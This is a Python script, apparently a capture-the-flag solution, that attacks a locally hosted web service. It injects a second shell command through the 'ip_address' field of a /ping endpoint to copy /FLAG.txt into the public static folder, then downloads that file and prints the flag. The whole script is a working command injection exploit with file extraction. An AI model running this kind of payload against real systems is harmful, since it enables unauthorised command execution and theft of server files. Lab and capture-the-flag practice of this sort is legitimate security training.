import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

# Setup session with retry logic
session = requests.Session()
retry = Retry(connect=3, backoff_factor=0.5)
adapter = HTTPAdapter(max_retries=retry)
session.mount('http://', adapter)

base_url = "http://127.0.0.1:32814"

print("[STEP 1] Command Injection via /ping")
print("=" * 60)

# POST to /ping with command injection
ping_url = f"{base_url}/ping"
data = {"ip_address": "127.0.0.1; cp /FLAG.txt /app/static/flag_extracted.txt"}

try:
    resp1 = session.post(ping_url, data=data, timeout=10)
    print(f"POST {ping_url}")
    print(f"Status: {resp1.status_code}")
    print(f"Response: {resp1.text}")
except Exception as e:
    print(f"Error: {e}")

print("\n[STEP 2] Retrieve Flag from /static/flag_extracted.txt")
print("=" * 60)

# GET the extracted flag
flag_url = f"{base_url}/static/flag_extracted.txt"

try:
    resp2 = session.get(flag_url, timeout=10)
    print(f"GET {flag_url}")
    print(f"Status: {resp2.status_code}")
    print(f"Content:\n{resp2.text}")
    
    if "FLAG{" in resp2.text:
        print(f"\n*** FLAG EXTRACTED: {resp2.text.strip()} ***")
except Exception as e:
    print(f"Error: {e}")

